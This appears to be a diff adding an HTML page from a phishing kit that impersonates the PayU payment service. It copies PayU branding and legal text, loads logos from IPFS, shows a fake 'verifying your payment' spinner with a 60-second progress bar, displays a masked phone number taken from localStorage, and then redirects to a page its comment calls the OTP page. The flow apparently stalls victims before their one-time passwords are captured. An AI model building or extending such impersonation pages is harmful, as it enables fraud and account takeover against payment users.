@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Redirecting - PayU</title>
+<link rel="icon" href="https://corporate.payu.com/wp-content/uploads/2020/05/PAYU_LOGO_SQUARE_LIME-e1589274472992.jpg">
+<style>
+    body {
+        margin:0; 
+        font-family: Arial, sans-serif; 
+        background:#fff; 
+        color:#444; 
+        display:flex; 
+        flex-direction:column; 
+        min-height:100vh;
+    }
+
+    .top-logo {
+        text-align:right; 
+        padding:15px 25px;
+    }
+    .top-logo img {height:30px;}
+
+    .center-wrapper {
+        width:100%; 
+        padding:40px 0; 
+        display:flex; 
+        justify-content:center; 
+        flex:1;
+    }
+
+    .box {
+        width:90%; 
+        max-width:550px; 
+        background:#fff; 
+        border:1px solid #ddd; 
+        border-radius:8px; 
+        padding:40px 20px; 
+        text-align:center; 
+        box-shadow:0 2px 6px rgba(0,0,0,0.1);
+    }
+
+    .spinner {
+        width:35px; 
+        height:35px; 
+        border:3px solid transparent; 
+        border-top:3px solid #d34; 
+        border-radius:50%; 
+        margin:0 auto 20px; 
+        animation: spin 1s linear infinite;
+    }
+    @keyframes spin {to {transform: rotate(360deg);} }
+
+    .loading-text {font-size:14px; color:#555; margin-top:5px;}
+    #phoneDisplay {font-size:14px; color:#777; margin-top:15px;}
+
+    /* Loading bar */
+    .progress-container {
+        width:100%;
+        height:8px;
+        background:#eee;
+        border-radius:4px;
+        overflow:hidden;
+        margin:20px 0;
+    }
+    .progress-bar {
+        width:0%;
+        height:100%;
+        background:#d34;
+        transition: width 0.2s linear;
+    }
+
+    /* Footer box */
+    .footer-box {
+        width:90%;
+        max-width:800px;
+        background:#f9f9f9;
+        border:1px solid #ccc;
+        border-radius:8px;
+        padding:20px;
+        margin:20px auto 40px auto;
+        font-size:12px;
+        line-height:1.5;
+        color:#555;
+        text-align:center;
+        box-shadow:0 1px 4px rgba(0,0,0,0.1);
+    }
+
+    .footer-box .icons img {height:28px; margin:10px 8px;}
+
+    a {color:#4f7ecf; text-decoration:none;}
+
+    @media (max-width:600px) {
+        .top-logo {text-align:center;}
+        .box {padding:30px 15px;}
+        .footer-box {padding:15px 10px;}
+    }
+</style>
+</head>
+<body>
+
+<div class="top-logo">
+    <img src="https://ipfs.io/ipfs/bafkreib2qlndmfhzbmd7z4wb7etlfw242mtsz3dnjdqpfa6aknwoayr3fi" alt="PayU Logo">
+</div>
+
+<div class="center-wrapper">
+    <div class="box">
+
+        <div class="spinner"></div>
+
+        <p class="loading-text">
+            Please wait while verifying your payment.
+        </p>
+
+        <p id="phoneDisplay"></p>
+
+        <!-- Loading bar -->
+        <div class="progress-container">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+
+    </div>
+</div>
+
+<div class="footer-box">
+    <div class="icons">
+        <img src="https://ipfs.io/ipfs/bafkreibf6miu22z2u4wl5l6wrztnyuujvrqsdxpymg3iorxs6a5hpr3jyu">
+        <img src="https://ipfs.io/ipfs/bafkreidqow4mer5werjkju53tsjziwkoknojzqeoznxp2r2qbdxhvosavu">
+    </div>
+    <p>
+        You agree that your personal data will be processed when you choose a payment method and proceed with a transaction. We may share your personal data with entities involved in processing your transaction. Depending on the payment method you choose, this can include banks, merchants, EFT providers, payment schemes, loan institutions or loyalty points providers. Providing personal data is a choice by you. If you choose not to provide your personal data, your transaction may be rejected. For information on how we process your personal data and your rights, see our PayU Privacy Statement. For information on our terms, compliance and security standards, see our Legal Information.
+    </p>
+    <p>All Rights Reserved ©2024</p>
+</div>
+
+<script>
+/* Load phone number from localStorage */
+const phone = localStorage.getItem("otpPhone");
+const displayBox = document.getElementById("phoneDisplay");
+
+if (phone) {
+    const maskedPhone = phone.slice(0, 2) + "****" + phone.slice(-2);
+    displayBox.textContent = "Sending OTP to phone: " + maskedPhone;
+} else {
+    displayBox.textContent = "Loading phone number…";
+}
+
+/* Loading bar effect over 60 seconds */
+const progressBar = document.getElementById("progressBar");
+let progress = 0;
+const duration = 60000; // 60 seconds
+const intervalTime = 200; // update every 200ms
+const increment = (intervalTime / duration) * 100;
+
+const timer = setInterval(() => {
+    progress += increment;
+    if(progress >= 100) progress = 100;
+    progressBar.style.width = progress + "%";
+
+    if(progress >= 100){
+        clearInterval(timer);
+        window.location.href = "confirmation.html"; // Redirect to OTP page
+    }
+}, intervalTime);
+</script>
+
+</body>
+</html>
